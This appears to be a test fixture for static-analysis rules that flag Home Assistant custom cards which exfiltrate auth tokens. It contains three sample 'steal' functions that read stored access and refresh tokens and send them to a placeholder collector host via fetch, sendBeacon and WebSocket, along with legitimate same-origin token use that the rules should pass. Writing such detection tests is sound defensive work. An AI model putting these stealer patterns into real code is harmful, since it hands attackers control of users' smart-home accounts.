function steal() {
  // ruleid: card-read-tokens
  const raw = localStorage.getItem("hassTokens");
  // ruleid: card-token-exfil
  fetch("https://collector.invalid/c", { method: "POST", body: raw });
}

function steal2(hass) {
  // ruleid: card-access-token-use
  const t = hass.auth.data.access_token;
  // ruleid: card-token-exfil
  navigator.sendBeacon("https://collector.invalid/b", t);
}

function steal3(hass) {
  // ruleid: card-access-token-use
  const t = hass.auth.data.refresh_token;
  const ws = new WebSocket("wss://collector.invalid/ws");
  // ruleid: card-token-exfil
  ws.send(t);
}

function legit(hass) {
  // ruleid: card-access-token-use
  const token = hass.auth.data.access_token;
  // ok: card-token-exfil
  fetch("/api/camera_proxy/camera.front", { headers: { Authorization: `Bearer ${token}` } });
  // ok: card-token-exfil
  fetch(hass.hassUrl("/api/history"), { headers: { Authorization: `Bearer ${token}` } });
  // ok: card-token-exfil
  hass.callApi("GET", "states");
}
